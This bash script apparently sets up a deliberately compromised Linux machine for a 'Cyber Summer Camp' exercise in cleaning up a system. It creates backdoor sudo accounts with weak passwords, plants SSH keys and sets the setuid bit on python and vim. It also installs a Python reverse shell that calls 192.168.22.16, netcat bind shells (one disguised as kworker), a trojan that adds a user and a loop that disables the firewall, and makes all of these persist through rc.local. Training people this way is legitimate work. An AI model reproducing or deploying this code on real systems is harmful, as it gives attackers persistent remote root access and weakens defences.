#!/bin/bash
useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group
# -u uid
apt-get -y install telnetd
apt-get -y install dropbear
apt-get -y install nmap
apt-get -y install sl
apt-get -y install cowsay

/bin/sed -i "s/^#Banner.*/Banner etc\/issue.net/g" /etc/ssh/sshd_config

useradd -M -g sudo -u 98 -p $(openssl passwd -crypt tre) tre
useradd -M -g sudo -u 99 -p $(openssl passwd -crypt sys) system
for user in elsa anna hans olaf kristoff sven marshmallow pabbie oaken bulda
do
  useradd -m -g sudo -p $(openssl passwd -crypt $user) $user
done
sleep 2

mkdir -p /home/student/.ssh & touch /home/student/.ssh/authorized_keys 
mkdir -p /home/elsa/.ssh & touch /home/elsa/.ssh/authorized_keys 
mkdir -p /home/tre/.ssh & touch /home/tre/.ssh/authorized_keys 
cat << EOF >> /home/student/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF
cat << EOF >> /home/elsa/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF
cat << EOF >> /home/tre/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF

chmod 4755 /usr/bin/python
chmod 4755 /usr/bin/vim


cat << EOF > /bin/virus.sh
#!/bin/bash
while true
do
  /usr/sbin/ufw disable
  sleep 500
done
EOF
chmod 755 /bin/virus.sh

cat << EOF > /home/student/malware.sh
#!/bin/bash
/usr/bin/yes "Megan thinks its cool not to remove malware!"
EOF
chmod 755 /home/student/malware.sh

cat << 'EOF' >> /home/student/.bashrc
alias ls='/home/student/malware.sh; ls'
alias wall='cowsay "Whats the password?" | wall'
. /etc/bash.bashrc
EOF

cat << 'EOF' >> /root/.bashrc
alias wall='cowsay "Whats the password?" | wall'
. /etc/bash.bashrc
EOF

cat << EOF > /etc/rc.local
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other

#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/sbin/trojan.py || /bin/true
/bin/rshell.py || bin/true
/root/open_sesame_VIRUS.sh || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 1111 || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 3333 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
exit 0
EOF


cat << 'EOF' >> /bin/rshell.py
#!/usr/bin/python
# Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
import socket
import subprocess

HOST = '192.168.22.16'    # The remote host
PORT = 5555            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
    # recv command line param
    data = s.recv(1024)
    # execute command line
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()
    # send back to attacker
    s.send(stdout_value)
# quit out afterwards and kill socket
s.close()
EOF
chmod 755 /bin/rshell.py

cat << 'EOF' >> /etc/bash.bashrc
#PS1="\u@\h:\w\$ "
#what user@comp prompt looks like
if [ $(id -u) -eq 0 ];
then #root
 PS1="\[\033[0;31m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;31m\]#\[\033[0m\] "
else #normal
 PS1="\[\033[0;32m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;37m\]$\[\033[0m\] "
fi

sudo() {
    if [[ $@ == "su" ]]; then
        PS1="\[\033[0;31m\]root\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;31m\]#\[\033[0m\]"
    else
        command sudo "$@"
    fi
}

#Auto complete lines
bind '"\t":menu-complete'
#tab cycling
bind '"\e[Z": menu-complete-backward'
#works for tab backwards
EOF

cat << 'EOF' >> /sbin/trojan.py
#!/usr/bin/python
import os
import crypt
password ="cookie"
encPass = crypt.crypt(password,"22")
os.system("useradd -g sudo -p "+encPass+" bagels")
EOF
chmod 755 /sbin/trojan.py


cat << 'EOF' >> /root/open_sesame_VIRUS.sh
rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 2 >/tmp/d
EOF
chmod 755 /root/open_sesame_VIRUS.sh

cat << 'EOF' >> /bin/kworker
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f
EOF
chmod 755 /bin/kworker
echo "Please add /bin/kworker to crontab -e"


cat << 'EOF' >> /bin/setHTML.sh
#!/bin/bash
# Set HTML Page
echo "Will only work as root/sudo"
read -p "Please enter HTML text: " banner
cat << EOF > /var/www/html/index.html
<html>
<title>Cyber Summer Camp 2.0</title>
<body><h1>${banner}</h1>
</body></html>
EOF

chmod 755 /bin/setHTML.sh
cp /bin/setHTML.sh /root
cp /bin/setHTML.sh /home/student

cat << 'EOF' >> /bin/setSSHBanner.sh
#!/bin/bash
#SSH Banner test - only /etc/issue.net
echo "Will only work as root/sudo"
read -p "Please enter SSH banner text: " banner
echo $banner > /etc/issue.net
EOF
chmod 755 /bin/setSSHBanner.sh
cp /bin/setSSHBanner.sh /root
cp /bin/setSSHBanner.sh /home/student

cat << 'EOF' >> /bin/changeSSHPort.sh
#!/bin/bash
echo "Will only work as root/sudo"
read -p "Enter new port number: " num
/bin/sed -i "s/^Port.*/Port $num/g" /etc/ssh/sshd_config
EOF
chmod 755 /bin/changeSSHPort.sh
cp /bin/changeSSHPort.sh/root
cp /bin/changeSSHPort.sh /home/student
